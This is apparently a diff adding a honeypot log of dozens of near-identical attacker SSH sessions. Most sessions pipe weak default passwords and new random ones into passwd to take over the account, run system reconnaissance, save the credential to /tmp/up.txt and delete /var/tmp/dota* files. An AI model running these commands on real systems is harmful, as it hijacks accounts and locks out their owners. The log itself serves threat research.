@@ -1,6 +1,5211 @@
-Session ID: 5d2555c04cd3
-ls -al /tmp/foo
-rm /tmp/foo
-ps -x
-dmesg | grep irtual
-lspci | grep irti
+Session ID: 1a0f727b1fab
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "hipchat\nb6gzeAIagdYb\nb6gzeAIagdYb"|passwd|bash
+echo "hipchat\nb6gzeAIagdYb\nb6gzeAIagdYb\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin hipchat" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 18cd56e00105
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin\n1vi4usckos6b\n1vi4usckos6b"|passwd|bash
+echo "admin\n1vi4usckos6b\n1vi4usckos6b\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: da5c24b81700
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@ssw0rd123\nIr5EEzXFWDUl\nIr5EEzXFWDUl"|passwd|bash
+echo "p@ssw0rd123\nIr5EEzXFWDUl\nIr5EEzXFWDUl\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@ssw0rd123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: aad211e69c02
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@ssw0rd123\nRQ5FBGZFJPmP\nRQ5FBGZFJPmP"|passwd|bash
+echo "p@ssw0rd123\nRQ5FBGZFJPmP\nRQ5FBGZFJPmP\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@ssw0rd123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 356f4214c118
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1q2w3e4r5t6y\nEhfxENdhVdLO\nEhfxENdhVdLO"|passwd|bash
+echo "1q2w3e4r5t6y\nEhfxENdhVdLO\nEhfxENdhVdLO\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1q2w3e4r5t6y" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 9b74eaa40b2c
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "passw0rd\nUgtoePYB692m\nUgtoePYB692m"|passwd|bash
+echo "passw0rd\nUgtoePYB692m\nUgtoePYB692m\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin passw0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: aec6d4a61d3d
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwe@1234\ntGnXCVU9pyQO\ntGnXCVU9pyQO"|passwd|bash
+echo "qwe@1234\ntGnXCVU9pyQO\ntGnXCVU9pyQO\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwe@1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: e3b9e71973d7
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "root\nRYz4zESdD1W4\nRYz4zESdD1W4"|passwd|bash
+echo "root\nRYz4zESdD1W4\nRYz4zESdD1W4\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin root" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: c4872614ab78
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin\nTNaV0eBCuKKN\nTNaV0eBCuKKN"|passwd|bash
+echo "admin\nTNaV0eBCuKKN\nTNaV0eBCuKKN\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 1285639b8b72
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@ssword\nLY1ZHblCySM3\nLY1ZHblCySM3"|passwd|bash
+echo "p@ssword\nLY1ZHblCySM3\nLY1ZHblCySM3\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@ssword" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 798829bf9e06
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "root\nbLoWWkaGfiN8\nbLoWWkaGfiN8"|passwd|bash
+echo "root\nbLoWWkaGfiN8\nbLoWWkaGfiN8\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin root" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: eba5e49a7573
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "Password\nBSsDodKa19M5\nBSsDodKa19M5"|passwd|bash
+echo "Password\nBSsDodKa19M5\nBSsDodKa19M5\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin Password" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: f04fb50b5860
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123qwe\nKtp6ZK7LhIxc\nKtp6ZK7LhIxc"|passwd|bash
+echo "123qwe\nKtp6ZK7LhIxc\nKtp6ZK7LhIxc\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123qwe" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 2b63db3c68c4
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "letmein\nPeJ6WtqjPyww\nPeJ6WtqjPyww"|passwd|bash
+echo "letmein\nPeJ6WtqjPyww\nPeJ6WtqjPyww\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin letmein" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: fce11fee1e74
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@55w0rd\nFUjrFzlq3Sjk\nFUjrFzlq3Sjk"|passwd|bash
+echo "P@55w0rd\nFUjrFzlq3Sjk\nFUjrFzlq3Sjk\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@55w0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 7f1b59ac3899
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "root\ntVew35aR4xFj\ntVew35aR4xFj"|passwd|bash
+echo "root\ntVew35aR4xFj\ntVew35aR4xFj\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin root" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: dfa8f7204ead
+LC_ALL=C top -bn1
+
+Session ID: a7712d124cca
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "letmein\nwKlhfSRfa36g\nwKlhfSRfa36g"|passwd|bash
+echo "letmein\nwKlhfSRfa36g\nwKlhfSRfa36g\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin letmein" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 48ccdfce0dde
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "letmein\nfNxB2hxcmSjn\nfNxB2hxcmSjn"|passwd|bash
+echo "letmein\nfNxB2hxcmSjn\nfNxB2hxcmSjn\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin letmein" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d79ddbdf8d15
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "letmein\ntUTobR0d2wfi\ntUTobR0d2wfi"|passwd|bash
+echo "letmein\ntUTobR0d2wfi\ntUTobR0d2wfi\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin letmein" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 7ce6b5adcc1d
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "guest\nV2ZBo45JMtL3\nV2ZBo45JMtL3"|passwd|bash
+echo "guest\nV2ZBo45JMtL3\nV2ZBo45JMtL3\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin guest" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: f527ba542fa3
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1q2w3e\n7gtTotoO3i8S\n7gtTotoO3i8S"|passwd|bash
+echo "1q2w3e\n7gtTotoO3i8S\n7gtTotoO3i8S\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1q2w3e" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 4b2434305d7b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "!QAZxsw2\nzhcUJobOpTXx\nzhcUJobOpTXx"|passwd|bash
+echo "!QAZxsw2\nzhcUJobOpTXx\nzhcUJobOpTXx\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin !QAZxsw2" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 3d1042009df0
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "root\nKD6b0wQ1qZaw\nKD6b0wQ1qZaw"|passwd|bash
+echo "root\nKD6b0wQ1qZaw\nKD6b0wQ1qZaw\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin root" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 4d9e35fb58a7
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qweasd123\nM30qk5KmhIFM\nM30qk5KmhIFM"|passwd|bash
+echo "qweasd123\nM30qk5KmhIFM\nM30qk5KmhIFM\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qweasd123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 655f3cb1e1dc
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin1234\nFSwqyfRGSF0X\nFSwqyfRGSF0X"|passwd|bash
+echo "admin1234\nFSwqyfRGSF0X\nFSwqyfRGSF0X\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 5b5cfb6bcd26
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "access\nHD0ZFGgOlUCm\nHD0ZFGgOlUCm"|passwd|bash
+echo "access\nHD0ZFGgOlUCm\nHD0ZFGgOlUCm\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin access" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: f787dcef1893
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "root\nKD6b0wQ1qZaw\nKD6b0wQ1qZaw"|passwd|bash
+echo "root\nKD6b0wQ1qZaw\nKD6b0wQ1qZaw\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin root" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 7c4e7e7b6080
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qweasd123\nXoNxyIz4WjJk\nXoNxyIz4WjJk"|passwd|bash
+echo "qweasd123\nXoNxyIz4WjJk\nXoNxyIz4WjJk\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qweasd123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: e24e2d349948
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwerty123\natAiygu0DqDz\natAiygu0DqDz"|passwd|bash
+echo "qwerty123\natAiygu0DqDz\natAiygu0DqDz\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwerty123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: e295f85ca3eb
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@$$wOrd\nHSMV5UlSK6nX\nHSMV5UlSK6nX"|passwd|bash
+echo "p@$$wOrd\nHSMV5UlSK6nX\nHSMV5UlSK6nX\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@$$wOrd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 8f6613bb5158
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "321\nJSxDDmjpRysP\nJSxDDmjpRysP"|passwd|bash
+echo "321\nJSxDDmjpRysP\nJSxDDmjpRysP\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 321" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d503b36f1de4
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "aerohive\nbzC593vGbWvY\nbzC593vGbWvY"|passwd|bash
+echo "aerohive\nbzC593vGbWvY\nbzC593vGbWvY\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin aerohive" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: f7405fce505a
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "4dm1n\nLtKGZ2btiNYo\nLtKGZ2btiNYo"|passwd|bash
+echo "4dm1n\nLtKGZ2btiNYo\nLtKGZ2btiNYo\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 4dm1n" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: ca91927c37eb
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123admin123\nUcBlsgWF74Qy\nUcBlsgWF74Qy"|passwd|bash
+echo "123admin123\nUcBlsgWF74Qy\nUcBlsgWF74Qy\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123admin123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 21663f5d26f9
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "pass@123\nfUiRPsacvDVo\nfUiRPsacvDVo"|passwd|bash
+echo "pass@123\nfUiRPsacvDVo\nfUiRPsacvDVo\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin pass@123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 112f5c5bd4da
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "articon\nfKdGe5GkFpDV\nfKdGe5GkFpDV"|passwd|bash
+echo "articon\nfKdGe5GkFpDV\nfKdGe5GkFpDV\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin articon" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d04c41ea7d97
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@ssw0rd\nzP5OJb2AUGi2\nzP5OJb2AUGi2"|passwd|bash
+echo "P@ssw0rd\nzP5OJb2AUGi2\nzP5OJb2AUGi2\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@ssw0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: c0e8929bf71a
